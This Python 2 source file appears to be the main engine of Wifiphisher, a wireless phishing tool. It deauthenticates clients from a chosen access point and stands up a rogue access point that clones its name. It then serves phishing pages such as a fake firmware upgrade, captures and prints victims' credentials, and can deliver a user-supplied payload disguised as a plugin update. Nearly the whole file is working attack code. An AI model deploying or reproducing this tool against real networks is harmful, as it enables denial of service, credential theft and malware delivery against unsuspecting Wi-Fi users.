#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#pylint: skip-file
import subprocess
import os
import time
import sys
import argparse
import fcntl
import curses
import socket
import struct
from blessings import Terminal
from threading import Thread
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from wifiphisher.common.constants import *
import wifiphisher.common.deauth as deauth
import wifiphisher.common.recon as recon
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.firewall as firewall
import wifiphisher.common.accesspoint as accesspoint


VERSION = "1.2GIT"
args = 0
mon_MAC = 0
APs = {}  # for listing APs


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-s",
        "--skip",
        help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA"
    )
    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Manually choose an interface that supports monitor mode for " +
              "deauthenticating the victims. " +
              "Example: -jI wlan1"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Manually choose an interface that supports AP mode for  " +
              "spawning an AP. " +
              "Example: -aI wlan0"
              )
    )
    parser.add_argument(
        "-iI",
        "--internetinterface",
        help=("Choose an interface that is connected on the Internet" +
              "Example: -iI ppp0"
              )
    )
    parser.add_argument(
        "-t",
        "--timeinterval",
        help=("Choose the time interval between DEAUTH packets being sent")
    )
    parser.add_argument(
        "-dP",
        "--deauthpackets",
        help=("Choose the number of packets to send in each deauth burst. " +
              "Default value is 1; 1 packet to the client and 1 packet to " +
              "the AP. Send 2 deauth packets to the client and 2 deauth " +
              "packets to the AP: -dP 2"
              )
    )
    parser.add_argument(
        "-d",
        "--directedonly",
        help=("Skip the deauthentication packets to the broadcast address of" +
              "the access points and only send them to client/AP pairs"
              ),
        action='store_true')
    parser.add_argument(
        "-nJ",
        "--nojamming",
        help=("Skip the deauthentication phase. When this option is used, " +
              "only one wireless interface is required"
              ),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("Enter the ESSID of the rogue Access Point. " +
              "This option will skip Access Point selection phase. " +
              "Example: --essid 'Free WiFi'"
              )
    )
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("Choose the phishing scenario to run." +
              "This option will skip the scenario selection phase. " +
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point. " +
              "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-qS",
        "--quitonsuccess",
        help=("Stop the script after successfully retrieving one pair of "
              "credentials"),
        action='store_true')

    return parser.parse_args()


def check_args(args):
    """
    Checks the given arguments for logic errors.
    """

    if args.presharedkey and \
        (len(args.presharedkey) < 8
         or len(args.presharedkey) > 64):
        sys.exit(
            '[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')

    if ((args.jamminginterface and not args.apinterface) or
            (not args.jamminginterface and args.apinterface)) and \
            not (args.nojamming and args.apinterface):
        sys.exit('[' + R + '-' + W + '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')

    if args.nojamming and args.jamminginterface:
        sys.exit(
            '[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')


def set_ip_fwd():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
        stdout=DN,
        stderr=PIPE
    )


def set_route_localnet():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )


def select_template(template_argument, template_manager):
    """
    Select a template based on whether the template argument is set or not. If
    the template argument is not set, it will interactively ask user for a
    template.

    Args:
        template_argument (str): The template argument which might have been
                                 entered by the user.

    Returns:
        (PhishingTemplate): A PhishingTemplate object.

    Raises:
        InvalidTemplate: In case the template argument entered by the user is
                         not available.
    """

    # get all available templates
    templates = template_manager.get_templates()

    # get all the templates names for display
    template_names = list(templates.keys())

    # check if the template argument is set and is correct
    if template_argument and template_argument in templates:
        # return the template name
        return templates[template_argument]
    elif template_argument and template_argument not in templates:
        # in case of an invalid template
        raise phishingpage.InvalidTemplate
    else:
        # loop until all operations for template selection is done
        while True:
            # clear the screen
            subprocess.call('clear', shell=True)

            # display template header
            print "\nAvailable Phishing Scenarios:\n"

            # display the templates
            for number in range(len(template_names)):
                print (G + str(number + 1) + W + " - " +
                       str(templates[template_names[number]]))

            # get user's choice
            choosen_template = raw_input("\n[" + G + "+" + W +
                                         "] Choose the [" + G + "num" + W +
                                         "] of the scenario you wish to use: ")

            # placed to avoid a program crash in case of non integer input
            try:
                template_number = int(choosen_template)
            except ValueError:
                print "\n[" + R + "-" + W + "] Please input an integer."

                # start from the beginning
                continue

            if template_number not in range(1, len(template_names) + 1):
                print ("\n[" + R + "-" + W + "] Wrong input number! please" +
                       " try again")

                # start from the beginning
                continue

            # remove 1 from template number which was added for display reasons
            template_number -= 1

            # return the chosen template
            return templates[template_names[template_number]]


def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] Monitor mode: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac


def sniff_dot11(mon_iface):
    """
    We need this here to run it from a thread.
    """
    try:
        sniff(iface=mon_iface, store=0, prn=cb, stop_filter=stopfilter)
    except socket.error as e:
        # Network is down
        if e.errno == 100:
            pass
        else:
            raise


def select_access_point(screen, interface, mac_matcher):
    """
    Return the access point the user has selected

    :param screen: A curses window object
    :param interface: An interface to be used for finding access points
    :type screen: _curses.curses.window
    :type interface: NetworkAdapter
    :return: Choosen access point
    :rtype: accesspoint.AccessPoint
    """

    # make cursor invisible
    curses.curs_set(0)

    # don't wait for user input
    screen.nodelay(True)

    # start finding access points
    access_point_finder = recon.AccessPointFinder(interface)
    access_point_finder.find_all_access_points()

    position = 1
    page_number = 1

    # get window height, length and create a box inside
    max_window_height, max_window_length = screen.getmaxyx()
    box = curses.newwin(max_window_height-9, max_window_length-5, 4, 3)
    box.box()

    # calculate the box's maximum number of row's
    box_height = box.getmaxyx()[0]
    # subtracting 2 from the height for the border
    max_row = box_height-2

    # information regarding access points
    access_points = list()
    total_ap_number = 0

    # added so it would go through the first iteration of the loop
    key = 0

    # show information until user presses Esc key
    while key != 27:

        # resize the window if it's dimensions have been changed
        if screen.getmaxyx() != (max_window_height, max_window_length):
            max_window_height, max_window_length = screen.getmaxyx()
            box.resize(max_window_height-9, max_window_length-5)

            # calculate the box's maximum number of row's
            box_height = box.getmaxyx()[0]
            # subtracting 2 from the height for the border
            max_row = box_height-2

            # reset the page and position to avoid problems
            position = 1
            page_number = 1

        # check if any new access points have been discovered
        if len(access_point_finder.get_all_access_points()) != total_ap_number:
            access_points = access_point_finder.get_sorted_access_points()
            total_ap_number = len(access_points)

        # display the information to the user
        display_access_points((screen, box, access_points, total_ap_number, page_number, position), mac_matcher)

        # check for key movement and store result
        key_movement_result = key_movement((key, position, page_number, max_row, access_points))
        key = key_movement_result[0]
        position = key_movement_result[1]
        page_number = key_movement_result[2]

        # ask for a key input (doesn't block)
        key = screen.getch()

        # in case ENTER key has been pressed on a valid access point
        if key == ord("\n") and total_ap_number != 0:
            # show message and exit
            screen.addstr(max_window_height-2, 3, "YOU HAVE SELECTED " +
                          access_points[position-1].get_name())
            screen.refresh()
            time.sleep(1)

            # turn off access point discovery and return the result
            access_point_finder.stop_finding_access_points()
            return access_points[position-1]

    # turn off access point discovery
    access_point_finder.stop_finding_access_points()


def key_movement(information):
    """
    Check for any key movement and return it's result

    :param information: (key, position, page_number, max_row, access_points)
    :type information: tuple
    :return: (key, position, page_number)
    :rtype: tuple
    """

    # extract all the information
    key = information[0]
    position = information[1]
    page_number = information[2]
    max_row = information[3]
    access_points = information[4]

    # in case arrow down key has been pressed
    if key == curses.KEY_DOWN:
        # if next item exists move down, otherwise don't move
        try:
            access_points[position]
        except IndexError:
            key = 0
            return (key, position, page_number)

        # if next item is in the next page change page and move
        # down otherwise just move down)
        if position % max_row == 0:
            position += 1
            page_number += 1
        else:
            position += 1

    # in case arrow up key has been pressed
    elif key == curses.KEY_UP:
        # if not the first item
        if (position-1) > 0:
            # if previous item is in previous page_number, change page
            # and move up otherwise just move up
            if (position-1) % max_row == 0:
                position -= 1
                page_number -= 1
            else:
                position -= 1

    return (key, position, page_number)


def display_access_points(information, mac_matcher):
    """
    Display information in the box window

    :param information: (screen, box, access_points, total_ap_number, page_number, position)
    :type information: tuple
    :return: None
    :rtype: None
    .. note: The display system is setup like the following:

             ----------------------------------------
             - (1,3)Options                         -
             -   (3,5)Header                        -
             - (4,3)****************************    -
             -      *       ^                  *    -
             -      *       |                  *    -
             -      *       |                  *    -
             -    < *       |----              *    -
             -    v *       |   v              *    -
             -    v *       |   v              *    -
             -    v *       |   v              *    -
             -    v *       v   v              *    -
             -    v ************v***************    -
             -    v             v      v            -
             -----v-------------v------v-------------
                  v             v      v
                  v             v      > max_window_length-5
                  v             v
            max_window_height-9 v
                                V
                                v--> box_height-2

    """

    # setup the font color
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)
    highlight_text = curses.color_pair(1)
    normal_text = curses.A_NORMAL

    # extract all the required information
    screen = information[0]
    box = information[1]
    access_points = information[2]
    total_ap_number = information[3]
    page_number = information[4]
    position = information[5]
    # TODO: pass max_row so you don't have to calculate it again
    # calculate the box's maximum number of row's
    box_height = box.getmaxyx()[0]
    # subtracting 2 from the height for the border
    max_row = box_height-2

    # get the page boundary
    page_boundary = range(1+(max_row*(page_number-1)), max_row+1+(max_row*(page_number-1)))

    # remove previous content and draw border
    box.erase()
    box.border(0)

    # show the header
    header = ("{0:30} {1:17} {2:2} {3:3} {4:7} {5:20}".format("ESSID", "BSSID", "CH", "PWR",
                                                              "CLIENTS", "VENDOR"))
    screen.addstr(1, 3, "Options:  [Esc] Quit  [Up Arrow] Move Up  [Down Arrow] Move Down")
    screen.addstr(3, 5, header)

    # show all the items based on their position
    for item_position in page_boundary:
        # in case of no access points discovered yet
        if total_ap_number == 0:
            box.addstr(1, 1, "No access point has been discovered yet!",  highlight_text)

        # in case of at least one access point
        else:
            # get the access point and it's vendor
            access_point = access_points[item_position-1]
            vendor = mac_matcher.get_vendor_name(access_point.get_mac_address())

            # the display format for showing access points
            display_text = ("{0:30} {1:17} {2:2} {3:3}% {4:^7} {5:20}"
                            .format(access_point.get_name(), access_point.get_mac_address(),
                                    access_point.get_channel(), access_point.get_signal_strength(),
                                    access_point.get_number_connected_clients(), vendor))

            # shows whether the access point should be highlighted or not
            # based on our current position
            if item_position+(max_row*(page_number-1)) == position+(max_row*(page_number-1)):
                box.addstr(item_position-(max_row*(page_number-1)), 2,
                           display_text, highlight_text)
            else:
                box.addstr(item_position-(max_row*(page_number-1)), 2, display_text, normal_text)

            # stop if it is the last item in page
            if item_position == total_ap_number:
                break

    # update the screen
    screen.refresh()
    box.refresh()


def kill_interfering_procs():
    # Kill any possible programs that may interfere with the wireless card
    # For systems with airmon-ng installed
    if os.path.isfile('/usr/sbin/airmon-ng'):
        proc = Popen(['airmon-ng', 'check', 'kill'], stdout=PIPE, stderr=DN)
    # For ubuntu distros with nmcli
    elif os.path.isfile('/usr/bin/nmcli') and \
            os.path.isfile('/usr/sbin/rfkill'):
        Popen(
            ['nmcli', 'radio', 'wifi', 'off'],
            stdout=PIPE,
            stderr=DN
        ).wait()
        Popen(
            ['rfkill', 'unblock', 'wlan'],
            stdout=PIPE,
            stderr=DN
        ).wait()

        time.sleep(1)


class WifiphisherEngine:

    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()

    def stop(self):
        print "[" + G + "+" + W + "] Captured credentials:"
        for cred in phishinghttp.creds:
            print cred

        self.network_manager.on_exit()
        self.template_manager.on_exit()
        self.access_point.on_exit()
        self.fw.on_exit()

        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')
     
        print '[' + R + '!' + W + '] Closing'
        sys.exit(0)

    def start(self):
        # Parse args
        global args, APs, mon_MAC
        args = parse_args()

        # Check args
        check_args(args)

        # Are you root?
        if os.geteuid():
            sys.exit('[' + R + '-' + W + '] Please run as root')

        # TODO: We should have more checks here:
        # Is anything binded to our HTTP(S) ports?
        # Maybe we should save current iptables rules somewhere

        # get interfaces for monitor mode and AP mode and set the monitor interface
        # to monitor mode. shutdown on any errors
        try:
            if args.internetinterface:
               internet_interface = self.network_manager.set_internet_iface(args.internetinterface)
            if not args.nojamming:
                if args.jamminginterface and args.apinterface:
                    mon_iface = self.network_manager.get_jam_iface(
                        args.jamminginterface)
                    ap_iface = self.network_manager.get_ap_iface(args.apinterface)
                else:
                    mon_iface, ap_iface = self.network_manager.find_interface_automatically()
                self.network_manager.set_jam_iface(mon_iface.get_name())
                self.network_manager.set_ap_iface(ap_iface.get_name())
                # display selected interfaces to the user
                print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                       "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                       "rogue Access Point").format(G, W, mon_iface.get_name(), ap_iface.get_name())
            else:
                if args.apinterface:
                    ap_iface = self.network_manager.get_ap_iface(
                        interface_name=args.apinterface)
                else:
                    ap_iface = self.network_manager.get_ap_iface()
                mon_iface = ap_iface
                self.network_manager.set_ap_iface(ap_iface.get_name())
                print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                       "rogue Access Point").format(G, W, ap_iface.get_name())

            kill_interfering_procs()
            self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.NotEnoughInterfacesFoundError,
                interfaces.JammingInterfaceInvalidError,
                interfaces.ApInterfaceInvalidError,
                interfaces.NoApInterfaceFoundError,
                interfaces.NoMonitorInterfaceFoundError) as err:
            print ("[{0}!{1}] " + str(err)).format(R, W)
            time.sleep(1)
            self.stop()

        if args.internetinterface:
            self.fw.nat(ap_iface.get_name(), args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()

        if not args.internetinterface:
            self.network_manager.up_ifaces([ap_iface, mon_iface])

        print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            ap_mac = None
            enctype = None
        else:
            # let user choose access point
            access_point = curses.wrapper(select_access_point, mon_iface, self.mac_matcher)

            # if the user has chosen a access point continue
            # otherwise shutdown
            if access_point:
                # store choosen access point's information
                essid = access_point.get_name()
                channel = access_point.get_channel()
                ap_mac = access_point.get_mac_address()
                enctype = access_point.get_encryption()
            else:
                self.stop()
        # create a template manager object
        self.template_manager = phishingpage.TemplateManager()
        # get the correct template
        template = select_template(args.phishingscenario, self.template_manager)

        print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
               " template")

        # payload selection for browser plugin update
        if template.has_payload():
            payload_path = False
            # copy payload to update directory
            while not payload_path or not os.path.isfile(payload_path):
                # get payload path
                payload_path = raw_input("[" + G + "+" + W +
                                         "] Enter the [" + G + "full path" + W +
                                         "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print '[' + R + '-' + W + '] Invalid file path!'
            print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
            copyfile(payload_path, PHISHING_PAGES_DIR +
                     template.get_payload_path())

        APs_context = []
        for i in APs:
            APs_context.append({
                'channel': APs[i][0] or "",
                'essid': APs[i][1] or "",
                'bssid': APs[i][2] or "",
                'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': APs_context})

        # only get logo path if MAC address is present
        ap_logo_path = False
        if ap_mac:
            ap_logo_path = template.use_file(self.mac_matcher.get_vendor_logo_path(ap_mac))

        template.merge_context({
            'target_ap_channel': channel or "",
            'target_ap_essid': essid or "",
            'target_ap_bssid': ap_mac or "",
            'target_ap_encryption': enctype or "",
            'target_ap_vendor': self.mac_matcher.get_vendor_name(ap_mac) or "",
            'target_ap_logo_path': ap_logo_path or ""
        })

        # We want to set this now for hostapd. Maybe the interface was in "monitor"
        # mode for network discovery before (e.g. when --nojamming is enabled).
        self.network_manager.set_interface_mode(ap_iface, "managed")
        # Start AP
        self.access_point.set_interface(ap_iface.get_name())        
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)              
        if args.internetinterface:
            self.access_point.set_internet_interface(args.presharedkey)              
        print '[' + T + '*' + W + '] Starting the fake access point...'
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except:
            self.stop()

        # With configured DHCP, we may now start the web server
        if not args.internetinterface:
        # Start HTTP server in a background thread
            print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
            webserver = Thread(target=phishinghttp.runHTTPServer,
                               args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
            webserver.daemon = True
            webserver.start()

            time.sleep(1.5)

        # We no longer need mac_matcher
        self.mac_matcher.unbind()

        clients_APs = []
        APs = []
        mon_MAC = mon_mac(mon_iface.get_name())

        deauthentication = None
        if not args.nojamming:
            monchannel = channel
            # set the channel on the deauthenticating interface
            mon_iface.set_channel(int(channel))

            # start deauthenticating all client on target access point
            deauthentication = deauth.Deauthentication(ap_mac,
                                                       mon_iface.get_name())
            deauthentication.deauthenticate()

        # Main loop.
        try:
            term = Terminal()
            with term.fullscreen():
                while 1:
                    term.clear()
                    with term.hidden_cursor():
                        print term.move(0, term.width - 30) + "|"
                        print term.move(1, term.width - 30) + "|" + " " + term.bold_blue("Wifiphisher " + VERSION)
                        print term.move(2, term.width - 30) + "|" + " ESSID: " + essid
                        print term.move(3, term.width - 30) + "|" + " Channel: " + channel
                        print term.move(4, term.width - 30) + "|" + " AP interface: " + ap_iface.get_name()
                        print term.move(5, term.width - 30) + "|" + "_"*29
                        print term.move(1, 0) + term.blue("Deauthenticating clients: ")
                        if not args.nojamming:
                            # only show clients when jamming
                            if deauthentication.get_clients():
                                # show the 5 most recent devices
                                for client in deauthentication.get_clients()[-5:]:
                                    print client
                        print term.move(9,0) + term.blue("DHCP Leases: ")
                        if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                            proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
                            print term.move(10,0) + proc
                        print term.move(17,0) + term.blue("HTTP requests: ")
                        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                            proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
                            print term.move(18,0) + proc
                        if phishinghttp.terminate and args.quitonsuccess:
                            raise KeyboardInterrupt
        except KeyboardInterrupt:
            self.stop()


def run():
    try:
        print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
            (VERSION, time.strftime("%Y-%m-%d %H:%M")))
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n' + W
    except EOFError:
        print R + '\n (^D)' + O + ' interrupted\n' + W
